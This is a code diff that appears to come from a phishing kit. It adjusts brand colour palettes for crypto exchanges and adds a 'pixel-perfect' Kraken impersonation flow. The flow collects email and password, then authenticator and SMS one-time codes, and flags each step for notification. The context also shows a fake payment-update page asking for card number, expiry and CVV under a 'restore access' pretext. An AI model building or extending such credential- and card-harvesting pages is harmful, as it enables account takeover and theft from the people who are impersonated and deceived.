@@ -100,7 +100,7 @@ const PALETTES = {
 
   binance:        ['#0B0E11','#1E2026','#EAECEF','#F0B90B','#FCD535'],
   coinbase:       ['#0A0B0D','#161719','#FFFFFF','#0052FF','#1652F0'],
-  kraken:         ['#000000','#1A1A1A','#FFFFFF','#5741D9','#7B68EE'],
+  kraken:         ['#f0f0f8','#ffffff','#0a0a0a','#5741D9','#4631c5'],
   bitfinex:       ['#1B1B1B','#2A2A2A','#FFFFFF','#16B157','#12904C'],
   gemini:         ['#05061B','#0B0D2A','#FFFFFF','#00DCFA','#05D2F5'],
   okx:            ['#000000','#111111','#FFFFFF','#FFFFFF','#AAAAAA'],
@@ -700,6 +700,13 @@ const CAT_FLOWS = {
     { slug:'payment-update', form_type:'payment',page_title:'Update Payment',     headline:'Update Billing Details',     subheadline:'Update your payment details to restore access to your content', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'Update',     step_label:'Payment Update', notify_step:true  }
   ]
 };
+
+// ── Kraken — pixel-perfect match ────────────────────────────────────────────
+FLOWS.kraken = [
+  { slug:'login',    form_type:'login', page_title:'Sign in to Kraken',  headline:'Sign in to Kraken',         subheadline:'',                                             fields:['email','password'],  layout:'auth', cta:'Continue',  step_label:'Sign In',   notify_step:true  },
+  { slug:'2fa',      form_type:'otp',   page_title:'2-Step Verification',headline:'2-Step Verification',        subheadline:'Enter the code from your authenticator app',    fields:['code'],              layout:'otp',  cta:'Continue',  step_label:'2FA',       notify_step:true,  otp_length:6 },
+  { slug:'sms',      form_type:'otp',   page_title:'Verify Your Number', headline:'Verify Your Phone Number',   subheadline:'Enter the code we sent to your phone',          fields:['code'],              layout:'otp',  cta:'Continue',  step_label:'SMS Code',  notify_step:true,  otp_length:6 }
+];
 
 // ── Special video overrides ──────────────────────────────────────────────────
 FLOWS.netflixvideo = [
